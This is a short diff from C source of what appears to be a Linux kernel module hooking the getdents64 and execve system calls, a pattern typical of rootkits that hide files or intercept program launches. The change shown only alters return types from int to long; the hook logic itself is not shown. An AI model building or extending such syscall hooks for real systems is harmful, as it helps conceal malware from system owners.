@@ -114,11 +114,11 @@ asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 __user 
     return rv;
 }
 
-asmlinkage int hooked_execve(const char __user *filename,
+asmlinkage long hooked_execve(const char __user *filename,
                          const char __user *const __user *argv,
                          const char __user *const __user *envp)
 {
-    int rv;
+    long rv;
     char file[256];
     
     strncpy_from_user(file, filename, 256);
